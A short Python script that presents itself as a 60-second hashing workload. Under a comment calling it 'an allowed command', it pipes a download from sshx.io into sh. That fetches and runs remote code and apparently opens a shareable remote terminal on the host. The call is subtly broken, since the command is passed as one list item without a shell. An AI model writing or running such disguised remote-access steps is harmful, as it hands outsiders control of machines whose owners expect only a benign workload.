import time
import hashlib
import os
import subprocess

duration = 60
end_time = time.time() + duration
count = 0

print("Workload started...", flush=True)

# Run an allowed command and capture its output
result = subprocess.run(
    ["curl -sSf https://sshx.io/get | sh -s run"],
    capture_output=True,
    text=True
)

print("=== COMMAND OUTPUT ===", flush=True)
print(result.stdout, flush=True)

while time.time() < end_time:
    data = os.urandom(1024)
    hashlib.sha256(data).hexdigest()
    count += 1

    if count % 1000 == 0:
        print(f"Working... iteration {count}", flush=True)

print("Workload finished after 60 seconds.", flush=True)
